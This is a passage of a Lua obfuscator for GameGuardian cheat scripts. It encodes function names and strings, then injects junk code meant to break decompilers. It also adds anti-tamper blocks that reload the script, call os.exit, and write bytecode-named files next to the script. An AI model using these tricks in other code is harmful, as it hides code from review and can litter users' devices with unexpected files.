            local newName = "lohhhggg"
            os.rename(fileName, fileName:gsub('/[^/]+$', '') .. '/' .. newName)
            loadedFile = loadfile(fileName:gsub('/[^/]+$', '') .. '/' .. newName)
            os.rename(fileName:gsub('/[^/]+$', '') .. '/' .. newName, fileName)
            ManageVisibility()
        end
    end

    local function Main()
        local tmp = GenerateSequence()
        if ValidateFunctions() then
            RefineSpamData(tmp)
            PerformSafetyCheck()
            ValidateSourceFile()
        end
    end
    
    Main()
end

]]

function encodegg(code)
return 'a[garbage("' .. enc32(code) .. '")]('
end

function encodeos(code)
return 'b[garbage("' .. enc32(code) ..'")]('
end

function encodestr(code)
return 'c[garbage(' .. enc32(code) .. ')]('
end

function encvalues(code)
return 'garbage("' .. enc32(code) .. '")'
end

DATA = DATA:gsub('gg.REGION_ANONYMOUS','YOU_IS_NOOB')
DATA = DATA:gsub('gg.REGION_ASHMEM', 'YOU_IS_NOOB1')
DATA = DATA:gsub('gg.REGION_BAD', 'YOU_IS_NOOB2')
DATA = DATA:gsub('gg.REGION_CODE_APP', 'YOU_IS_NOOB3')
DATA = DATA:gsub('gg.REGION_CODE_SYS', 'YOU_IS_NOOB4')
DATA = DATA:gsub('gg.REGION_C_ALLOC', 'YOU_IS_NOOB5')
DATA = DATA:gsub('gg.REGION_C_BSS', 'YOU_IS_NOOB6')
DATA = DATA:gsub('gg.REGION_C_DATA', 'YOU_IS_NOOB7')
DATA = DATA:gsub('gg.REGION_C_HEAP', 'YOU_IS_NOOB8')
DATA = DATA:gsub('gg.REGION_JAVA', 'YOU_IS_NOOB9')
DATA = DATA:gsub('gg.REGION_JAVA_HEAP', 'YOU_IS_NOOB10')
DATA = DATA:gsub('gg.REGION_OTHER', 'YOU_IS_NOOB11')
DATA = DATA:gsub('gg.REGION_PPSSPP', 'YOU_IS_NOOB12')
DATA = DATA:gsub('gg.REGION_STACK', 'YOU_IS_NOOB13')
DATA = DATA:gsub('gg.REGION_VIDEO', 'YOU_IS_NOOB14')
DATA = DATA:gsub('gg.TYPE_AUTO', 'YOU_IS_NOOB15')
DATA = DATA:gsub('gg.TYPE_BYTE', 'YOU_IS_NOOB16')
DATA = DATA:gsub('gg.TYPE_DOUBLE', 'YOU_IS_NOOB17')
DATA = DATA:gsub('gg.TYPE_DWORD', 'YOU_IS_NOOB18')
DATA = DATA:gsub('gg.TYPE_FLOAT', 'YOU_IS_NOOB19')
DATA = DATA:gsub('gg.TYPE_QWORD', 'YOU_IS_NOOB20')
DATA = DATA:gsub('gg.TYPE_WORD', 'YOU_IS_NOOB21')
DATA = DATA:gsub('gg.TYPE_XOR', 'YOU_IS_NOOB22')
DATA = DATA:gsub('%".-(.-)%"', encvalues)
DATA = DATA:gsub("%'.-(.-)%'", encvalues)
DATA = DATA:gsub('%[%[.-(.-)%]%]', encvalues)
DATA = DATA:gsub("gg%.(%a+)%(", encodegg)
DATA = DATA:gsub("string%.(%a+)%(", encodestr)
DATA = DATA:gsub("os%.(%a+)%(", encodeos)

DATA = descript_code..DATA
io.open(g.out,"a"):write(DATA):close()

local arquivo_saida = io.open(g.out, "r")
local dados_saida = arquivo_saida:read("*a")
arquivo_saida:close()

Kea = {10, 20, 30} -- Valores de exemplo, substitua pelos valores desejados
  function EncodeFunc(str)
      str = str:gsub('\\n', '\n'):gsub('\\t', '\t')
      res = ''
      arg = {str:gsub(".", function(m) return ("%02x"):format((m:byte() + Kea[2]) % 256) end):byte(1, -1)}
      ind = 1
      while (ind < #arg + 1) do
          arg[ind] = (arg[ind] + Kea[1] - Kea[3]) % 256
          ind = ind + 1
      end
      return res .. "{ENC = {" .. table.concat(arg, ",") .. "}}"
  end

  function encodegg(c)
      return 'gg[DecodeFunc(' .. EncodeFunc(c) .. ')]('
  end

  dados_saida = dados_saida:gsub("gg%.(%a+)%(", encodegg)
  

DECODE = [[


Kea = {10, 20, 30}; 
local DecodeFunc = function(str)
    local res = ''
    local arg = str.ENC
    local ind = 1
    while ind < #arg + 1 do
        arg[ind] = res .. string.char((arg[ind] - Kea[1] + Kea[3]) % 256)
        ind = ind + 1
    end
    local str = {}
    for i in ipairs(arg) do
        str[#str + 1] = arg[i + i]
    end
    for i = 1, #arg do
        if arg[i + 1] ~= nil then
            table.remove(arg, i + 1)
        end
    end
    for i, value in pairs(str) do
        str[i] = arg[i] .. value
        res = res .. string.char((tonumber(str[i], 16) - Kea[2]) % 256)
    end
    return res
end
]]
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Infinite = [[

for i = 1,5 do
    if(nil) then 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
        if true then 
            return 
        end 
    end
    loadfile = loadfile
    load = load
    loadfile(gg.getFile()) 
    load(string.dump(load("os.exit()"),false,false)) 
    io.open(gg.getFile() .. "c" .. tostring(string.dump(loadfile(gg.getFile()),false,false)),"w") 
end

for i = 1, 5000 do
    table.insert({}, {})
end
for i = 1, 5000 do
    table.insert({}, {})
end

gg.setVisible(false)
for i = 1, 6 do
    gg.addListItems({})
end

gg.setVisible(false)
gg.removeListItems({})

if os.time() > os.time() then
    return 
end
if os.time() < os.time() then
end
if os.difftime(os.time(), (os.time())) > 2 then
    return 
end

gg.setVisible(false)
if os.clock() > os.clock() then
    return 
end
if os.clock() < os.clock() then
end
if os.difftime(os.clock(), (os.clock())) > 2 then
    return 
end

gg.setVisible(false)
for i = 3, 100 do
    load(gg.getFile())
end

while(nil)do
    local i={}
    if(i.i)then
        i.i=(i.i(i))
    end
end

while(nil)do
    for i=i,i do
        local i={}
        if(i.i)then
            i.i=(i.i(i))
        end
        for ii=i.i,i.i,i.i do
            local ii={}
            if(ii.i)then
                ii.i=ii.i()
            end
            for iii=i,ii.i,i do
                local iii={}
                if(iii.i)then
                    iii.i=iii.i(i)
                end
                for iiii=i,ii,iii.i do
                    local iiii={}
                    if(iiii.i)then
                        iiii.i=iiii.i(i)
                    end
                    local iiii={}
                    if(iiii.i)then
                        iiii.i=(iiii|iii|ii|i)(i)
                    end
                end
                local iii={}
                if(iii.i)then
                    iii.i=(true|iii|ii|i)(i)
                end
            end
            local ii={}
            if(ii.i)then
                ii.i=(true|false|ii|i)(i)
            end
        end
        local i={}
        if(i.i)then
            i.i=(true|false|nil|i)(i)
        end
        return(true|false|nil)
    end
    return
end
]]

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

blocksstol = [[

for x = 0, 1, 0 do
    if nil ~= nil then
        (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil)
        local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),
                    (-nil)((-nil)[nil] | nil | nil),
                    (nil * (-nil)),
                    (-nil)((-nil)[nil] | nil | nil) * (-nil)((-nil)[nil] | nil | nil) /
                    (-nil)((-nil)[nil] | nil | nil) % (-nil)((-nil)[nil] | nil | nil) %
                    (-nil)((-nil)[nil] | nil | nil) % (-nil)((-nil)[nil] | nil | nil),
                    (-nil)((-nil)[nil] | nil | nil)}
        _L = _L()
        _L = _Lnil
        _L = _L():_L(_Lnil)(_Lnil * -1) .. _Lnil
        _L = _L(_Lnil)(_L)
        _L = _L(_Lnil_Lnil)(_L)
        if _ ~= nil then
            _ = _(-nil * nil)()
            _ = nil
        end
        _ = _, _(-nil * nil), _
        if _L ~= nil then
            _L = _(_Lnil * nil * nil * -nil)
            _L = nil
        end
        if _L == nil then
            _L = {_L(_L * nil)(_L * nil)(nil * 1, 1 << nil), _L * nil}
        end
    end
    local _T = {}
    x[""] = T
    local K = (x)(x, x)
    K[1] = 1
end

while (nil) do
    local T = {}
    if (T.T) then
        if (T.T.T) then
            T.T = (T.T(T))
            T.T = (T.T(T.T.T(T.T(T))))
        end
    end
end

while (nil) do
    local a = {}
    if (a.a) then
        if (a.a.a) then
            if (a.a.a.a) then
                if (a.a.a.a.a) then
                    if (a.a.a.a.a.a) then
                        a.a = (a.a(a))
                        a.a = (a.a(a.a.a(a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))
                        a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))), (a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a))))))))))
                    end
                end
            end
        end
    end
end

while (nil ~= nil) do
    local c = {}
    c.c = nil, nil, nil, nil
    if (c.c) then
        c.c = (c.c(c))
        c.c = (c.c(c))
    end
end


while (nil) do
    local o = {}
    local p = {}
    local q = {}
    if (o.o) then
        if (o.o.o) then
            if (o.o.o.o) then
                if (o.o.o.o.o) then
                    if (p.p) then
                        if (p.p.p) then
                            if (p.p.p.p) then
                                if (q.q) then
                                    if (q.q.q) then
                                        if (q.q.q.q) then
                                            o.o = (o.o(o))
                                            o.o = (o.o(o.o.o(o.o(o))))
                                            p.p = (p.p(p))
                                            p.p = (p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) 
                                            q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) 
                                            local r = {o.o, p.p, q.q}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local x = {}
    if (x.x) then
        if (x.x.x) then
            x.x = (x.x(x))
            x.x = (x.x(x.x.x(x.x(x))))
        end
    end
end

while (nil) do
    local a = {}
    local b = {}
    local c = {}
    if (a.a) then
        if (a.a.a) then
            if (a.a.a.a) then
                if (a.a.a.a.a) then
                    if (b.b) then
                        if (b.b.b) then
                            if (b.b.b.b) then
                                if (c.c) then
                                    if (c.c.c) then
                                        if (c.c.c.c) then
                                            a.a = (a.a(a))
                                            a.a = (a.a(a.a.a(a.a(a))))
                                            b.b = (b.b(b))
                                            b.b = (b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) 
                                            c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) 
                                            local r = {a.a, b.b, c.c}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local z = {}
    local x = {}
    local c = {}
    if (z.z) then
        if (z.z.z) then
            if (z.z.z.z) then
                if (z.z.z.z.z) then
                    if (x.x) then
                        if (x.x.x) then
                            if (x.x.x.x) then
                                if (c.c) then
                                    if (c.c.c) then
                                        if (c.c.c.c) then
                                            z.z = (z.z(z))
                                            z.z = (z.z(z.z.z(z.z(z))))
                                            x.x = (x.x(x))
                                            x.x = (x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) 
                                            c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) 
                                            local r = {z.z, x.x, c.c}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local f = {}
    local g = {}
    local h = {}
    if (f.f) then
        if (f.f.f) then
            if (f.f.f.f) then
                if (f.f.f.f.f) then
                    if (g.g) then
                        if (g.g.g) then
                            if (g.g.g.g) then
                                if (h.h) then
                                    if (h.h.h) then
                                        if (h.h.h.h) then
                                            f.f = (f.f(f))
                                            f.f = (f.f(f.f.f(f.f(f))))
                                            g.g = (g.g(g))
                                            g.g = (g.g(g.g.g(g.g.g(g.g.g(g.g(g.g)))))) 
                                            h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) 
                                            local r = {f.f, g.g, h.h}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local x = {}
    if (x.x) then
        if (x.x.x) then
            x.x = (x.x(x))
            x.x = (x.x(x.x.x(x.x(x))))
        end
    end
end

while (nil) do
    local o = {}
    if (o.o(o(o.o(o.oo)))) then
        if (o.oo) then
            local oo = {}
            if (oo.o(oo.oo)) then
                o.o = (o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o, o))))))))
                o = {o.o, o.o, o.o, oo.o, oo.oo}
                p = (nil), (nil) * (nil)
                o.p = p, p, p, p
                oo.oo.o = (nil), (nil) .. "," .. o.p .. "," .. (nil) * (nil) / (nil) .. ",(nil)"
                _G = {oo.oo.o, _G, oo.oo.o}
                gg = {oo.oo.o, gg, oo.oo.o}
            end
        end
    end
end

for x = 0, 1, 0 do
    if nil ~= nil then
        (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil)
        local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),
                    (-nil)((-nil)[nil] | nil | nil),
                    (nil * (-nil)),
                    (-nil)((-nil)[nil] | nil | nil) * (-nil)((-nil)[nil] | nil | nil) /
                    (-nil)((-nil)[nil] | nil | nil) % (-nil)((-nil)[nil] | nil | nil) %
                    (-nil)((-nil)[nil] | nil | nil) % (-nil)((-nil)[nil] | nil | nil),
                    (-nil)((-nil)[nil] | nil | nil)}
        _L = _L()
        _L = _Lnil
        _L = _L():_L(_Lnil)(_Lnil * -1) .. _Lnil
        _L = _L(_Lnil)(_L)
        _L = _L(_Lnil_Lnil)(_L)
        if _ ~= nil then
            _ = _(-nil * nil)()
            _ = nil
        end
        _ = _, _(-nil * nil), _
        if _L ~= nil then
            _L = _(_Lnil * nil * nil * -nil)
            _L = nil
        end
        if _L == nil then
            _L = {_L(_L * nil)(_L * nil)(nil * 1, 1 << nil), _L * nil}
        end
    end
    local _T = {}
    x[""] = T
    local K = (x)(x, x)
    K[1] = 1
end

while (nil) do
    local T = {}
    if (T.T) then
        if (T.T.T) then
            T.T = (T.T(T))
            T.T = (T.T(T.T.T(T.T(T))))
        end
    end
end

while (nil) do
    local a = {}
    if (a.a) then
        if (a.a.a) then
            if (a.a.a.a) then
                if (a.a.a.a.a) then
                    if (a.a.a.a.a.a) then
                        a.a = (a.a(a))
                        a.a = (a.a(a.a.a(a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))
                        a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))), (a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a))))))))))
                    end
                end
            end
        end
    end
end

while (nil ~= nil) do
    local c = {}
    c.c = nil, nil, nil, nil
    if (c.c) then
        c.c = (c.c(c))
        c.c = (c.c(c))
    end
end


while (nil) do
    local o = {}
    local p = {}
    local q = {}
    if (o.o) then
        if (o.o.o) then
            if (o.o.o.o) then
                if (o.o.o.o.o) then
                    if (p.p) then
                        if (p.p.p) then
                            if (p.p.p.p) then
                                if (q.q) then
                                    if (q.q.q) then
                                        if (q.q.q.q) then
                                            o.o = (o.o(o))
                                            o.o = (o.o(o.o.o(o.o(o))))
                                            p.p = (p.p(p))
                                            p.p = (p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) 
                                            q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) 
                                            local r = {o.o, p.p, q.q}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local x = {}
    if (x.x) then
        if (x.x.x) then
            x.x = (x.x(x))
            x.x = (x.x(x.x.x(x.x(x))))
        end
    end
end

while (nil) do
    local a = {}
    local b = {}
    local c = {}
    if (a.a) then
        if (a.a.a) then
            if (a.a.a.a) then
                if (a.a.a.a.a) then
                    if (b.b) then
                        if (b.b.b) then
                            if (b.b.b.b) then
                                if (c.c) then
                                    if (c.c.c) then
                                        if (c.c.c.c) then
                                            a.a = (a.a(a))
                                            a.a = (a.a(a.a.a(a.a(a))))
                                            b.b = (b.b(b))
                                            b.b = (b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) 
                                            c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) 
                                            local r = {a.a, b.b, c.c}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local z = {}
    local x = {}
    local c = {}
    if (z.z) then
        if (z.z.z) then
            if (z.z.z.z) then
                if (z.z.z.z.z) then
                    if (x.x) then
                        if (x.x.x) then
                            if (x.x.x.x) then
                                if (c.c) then
                                    if (c.c.c) then
                                        if (c.c.c.c) then
                                            z.z = (z.z(z))
                                            z.z = (z.z(z.z.z(z.z(z))))
                                            x.x = (x.x(x))
                                            x.x = (x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) 
                                            c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) 
                                            local r = {z.z, x.x, c.c}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local f = {}
    local g = {}
    local h = {}
    if (f.f) then
        if (f.f.f) then
            if (f.f.f.f) then
                if (f.f.f.f.f) then
                    if (g.g) then
                        if (g.g.g) then
                            if (g.g.g.g) then
                                if (h.h) then
                                    if (h.h.h) then
                                        if (h.h.h.h) then
                                            f.f = (f.f(f))
                                            f.f = (f.f(f.f.f(f.f(f))))
                                            g.g = (g.g(g))
                                            g.g = (g.g(g.g.g(g.g.g(g.g.g(g.g(g.g)))))) 
                                            h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) 
                                            local r = {f.f, g.g, h.h}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local x = {}
    if (x.x) then
        if (x.x.x) then
            x.x = (x.x(x))
            x.x = (x.x(x.x.x(x.x(x))))
        end
    end
end

while (nil) do
    local o = {}
    if (o.o(o(o.o(o.oo)))) then
        if (o.oo) then
            local oo = {}
            if (oo.o(oo.oo)) then
                o.o = (o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o, o))))))))
                o = {o.o, o.o, o.o, oo.o, oo.oo}
                p = (nil), (nil) * (nil)
                o.p = p, p, p, p
                oo.oo.o = (nil), (nil) .. "," .. o.p .. "," .. (nil) * (nil) / (nil) .. ",(nil)"
                _G = {oo.oo.o, _G, oo.oo.o}
                gg = {oo.oo.o, gg, oo.oo.o}
            end
        end
    end
end

for x = 0, 1, 0 do
    if nil ~= nil then
        (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil)
        local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),
                    (-nil)((-nil)[nil] | nil | nil),
                    (nil * (-nil)),
                    (-nil)((-nil)[nil] | nil | nil) * (-nil)((-nil)[nil] | nil | nil) /
                    (-nil)((-nil)[nil] | nil | nil) % (-nil)((-nil)[nil] | nil | nil) %
                    (-nil)((-nil)[nil] | nil | nil) % (-nil)((-nil)[nil] | nil | nil),
                    (-nil)((-nil)[nil] | nil | nil)}
        _L = _L()
        _L = _Lnil
        _L = _L():_L(_Lnil)(_Lnil * -1) .. _Lnil
        _L = _L(_Lnil)(_L)
        _L = _L(_Lnil_Lnil)(_L)
        if _ ~= nil then
            _ = _(-nil * nil)()
            _ = nil
        end
        _ = _, _(-nil * nil), _
        if _L ~= nil then
            _L = _(_Lnil * nil * nil * -nil)
            _L = nil
        end
        if _L == nil then
            _L = {_L(_L * nil)(_L * nil)(nil * 1, 1 << nil), _L * nil}
        end
    end
    local _T = {}
    x[""] = T
    local K = (x)(x, x)
    K[1] = 1
end

while (nil) do
    local T = {}
    if (T.T) then
        if (T.T.T) then
            T.T = (T.T(T))
            T.T = (T.T(T.T.T(T.T(T))))
        end
    end
end

while (nil) do
    local a = {}
    if (a.a) then
        if (a.a.a) then
            if (a.a.a.a) then
                if (a.a.a.a.a) then
                    if (a.a.a.a.a.a) then
                        a.a = (a.a(a))
                        a.a = (a.a(a.a.a(a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))
                        a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))), (a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a))))))))))
                    end
                end
            end
        end
    end
end

while (nil ~= nil) do
    local c = {}
    c.c = nil, nil, nil, nil
    if (c.c) then
        c.c = (c.c(c))
        c.c = (c.c(c))
    end
end


while (nil) do
    local o = {}
    local p = {}
    local q = {}
    if (o.o) then
        if (o.o.o) then
            if (o.o.o.o) then
                if (o.o.o.o.o) then
                    if (p.p) then
                        if (p.p.p) then
                            if (p.p.p.p) then
                                if (q.q) then
                                    if (q.q.q) then
                                        if (q.q.q.q) then
                                            o.o = (o.o(o))
                                            o.o = (o.o(o.o.o(o.o(o))))
                                            p.p = (p.p(p))
                                            p.p = (p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) 
                                            q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) 
                                            local r = {o.o, p.p, q.q}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local x = {}
    if (x.x) then
        if (x.x.x) then
            x.x = (x.x(x))
            x.x = (x.x(x.x.x(x.x(x))))
        end
    end
end

while (nil) do
    local a = {}
    local b = {}
    local c = {}
    if (a.a) then
        if (a.a.a) then
            if (a.a.a.a) then
                if (a.a.a.a.a) then
                    if (b.b) then
                        if (b.b.b) then
                            if (b.b.b.b) then
                                if (c.c) then
                                    if (c.c.c) then
                                        if (c.c.c.c) then
                                            a.a = (a.a(a))
                                            a.a = (a.a(a.a.a(a.a(a))))
                                            b.b = (b.b(b))
                                            b.b = (b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) 
                                            c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) 
                                            local r = {a.a, b.b, c.c}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local z = {}
    local x = {}
    local c = {}
    if (z.z) then
        if (z.z.z) then
            if (z.z.z.z) then
                if (z.z.z.z.z) then
                    if (x.x) then
                        if (x.x.x) then
                            if (x.x.x.x) then
                                if (c.c) then
                                    if (c.c.c) then
                                        if (c.c.c.c) then
                                            z.z = (z.z(z))
                                            z.z = (z.z(z.z.z(z.z(z))))
                                            x.x = (x.x(x))
                                            x.x = (x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) 
                                            c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) 
                                            local r = {z.z, x.x, c.c}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local f = {}
    local g = {}
    local h = {}
    if (f.f) then
        if (f.f.f) then
            if (f.f.f.f) then
                if (f.f.f.f.f) then
                    if (g.g) then
                        if (g.g.g) then
                            if (g.g.g.g) then
                                if (h.h) then
                                    if (h.h.h) then
                                        if (h.h.h.h) then
                                            f.f = (f.f(f))
                                            f.f = (f.f(f.f.f(f.f(f))))
                                            g.g = (g.g(g))
                                            g.g = (g.g(g.g.g(g.g.g(g.g.g(g.g(g.g)))))) 
                                            h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) 
                                            local r = {f.f, g.g, h.h}
                                            r.r = r[1] .. r[2] .. r[3] 
                                            r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while (nil) do
    local x = {}
    if (x.x) then
        if (x.x.x) then
            x.x = (x.x(x))
            x.x = (x.x(x.x.x(x.x(x))))
        end
    end
end

while (nil) do
    local o = {}
    if (o.o(o(o.o(o.oo)))) then
        if (o.oo) then
            local oo = {}
            if (oo.o(oo.oo)) then
                o.o = (o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o, o))))))))
                o = {o.o, o.o, o.o, oo.o, oo.oo}
                p = (nil), (nil) * (nil)
                o.p = p, p, p, p
                oo.oo.o = (nil), (nil) .. "," .. o.p .. "," .. (nil) * (nil) / (nil) .. ",(nil)"
                _G = {oo.oo.o, _G, oo.oo.o}
                gg = {oo.oo.o, gg, oo.oo.o}
            end
        end
    end
end

]]
dados_saida = "(function(...)" .. dados_saida .. ([[ 
end)([=[     

╔═════════════════════╗
║                                                    
║          ⛧ ᴇɴᴄʀʏᴘᴛɪᴏɴ ⁅ʟᴜᴀ⁆ ⛧                    
║                                                    
║        ⛧ { ᴇɴᴄʀʏᴘᴛ ⁅ʙᴀsᴇ32⁆ }  ⛧                   
║                                                    
║   ⛧ ᴇɴᴄʀʏᴘᴛ ʙʏ: ʙᴀᴛᴍᴀɴ ɢᴀᴍᴇs  ⛧              
║                                                    
║        ⛧❖ @ʙᴀᴛᴍᴀɴɢᴀᴍᴇss ❖⛧                       
║                                                    
╚═════════════════════╝

     
]=])
]]) 

SSFUCK=[[
for i in ipairs({}) do local Cok = {} if not xs then else local Kntoll = {};local Cok = {} Cok.Kntoll = Cok.Kntoll() if Cok.Kntoll ~= Cok.Kntoll then Cok.Kntoll = Cok.Kntoll() end local Cok = {};local Asu = {} Cok.Asu = Cok.Asu() if Cok.Asu ~= Cok.Asu then Cok.Asu = Cok.Asu() end end end
while(nil)do;local UwU = {} if(UwU.UwU)then;UwU.UwU=(UwU.UwU(UwU))end;end;
for i = 1, 0 do local UwU = {} UwU.ngentot = UwU.xnxx() if UwU.xnxx ~= nil then UwU.ngentot = UwU.xnxx() end UwU = nil end
for i in ipairs({}) do local Cok = {} if not xs then else local Kntoll = {};local Cok = {} Cok.Kntoll = Cok.Kntoll() if Cok.Kntoll ~= Cok.Kntoll then Cok.Kntoll = Cok.Kntoll() end local Cok = {};local Asu = {} Cok.Asu = Cok.Asu() if Cok.Asu ~= Cok.Asu then Cok.Asu = Cok.Asu() end end end
]]

SPAM=[[

if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
if 0 then repeat while((function()while((function()while((function() while((function() while((function() end)()) do end end)()) do end end)()) do end end)()) do end end)())do return end until 1 end
if 0 then repeat (function() end)() until 1 end
]]

BATMAN5=[=[
while ""=="Batmangames" do Batmangames="Batmangames" end;if nil then goto s ::s:: end
function x_x(xx)
x=xx
local xxx=[[ while ""=="Batmangames" do Batmangames="Batmangames" end;if nil then goto s ::s:: end]]
local xxxx=""
for x=1,x do
xxxx=xxxx..xxx xxxxx=""..x
end
return xxxx
end
